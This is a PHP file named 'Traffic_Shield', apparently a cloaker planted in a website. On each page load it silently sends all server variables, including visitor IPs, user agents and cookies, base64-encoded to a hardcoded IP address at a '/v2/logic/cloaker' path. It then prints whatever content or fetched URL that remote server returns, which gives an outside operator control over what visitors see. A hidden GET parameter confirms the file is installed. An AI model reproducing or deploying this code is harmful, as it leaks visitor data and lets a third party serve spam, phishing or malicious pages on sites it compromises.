<?php
namespace TrafficShield;

error_reporting(0);

class Traffic_Shield {
    public function run() {
        ob_start();
        $this->ogrsr9854();
    }

    public function ogrsr9854() {
        $this->_check();
        $response = $this->https_request();
        $this->main($response);
    }

    public function _check() {
        if (isset($_GET["TS-BHDNR-84848"])) {
            echo "4ab85458be";
        }
    }

    public function get_header() {
        $headers = array();
        foreach ($_SERVER as $k => $v) {
            $headers[$k] = $v;
        }
        $headers["TS-BHDNR-74191"] = "900661405718873";
        $headers["TS-BHDNR-74194"] = "4ab85458be";
        return $headers;
    }

    public function get_header_post() {
        $get_header = $this->get_header();
        return base64_encode(json_encode($get_header));
    }

    public function https_request() {
        $get_header["headers"] = $this->get_header_post();
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://198.211.101.164/v2/logic/cloaker");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36");
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $get_header);
        $result = curl_exec($ch);
        return json_decode($result);
    }

    public function main($response) {
        if (!empty($response)) {
            if (isset($response->zrc) && !empty($response->zrc)) {
                echo base64_decode($response->zrc);
            } else {
                $this->get_url($response->url);
            }
        }
    }

    public function get_url($url) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $result = curl_exec($ch);
        curl_close($ch);

        if ($result === false) {
            echo "Bir hata oluştu.";
        } else {
            echo $result;
        }
    }
}

$traffic_Shield_Tre9854 = new Traffic_Shield();
$traffic_Shield_Tre9854->run();
?>
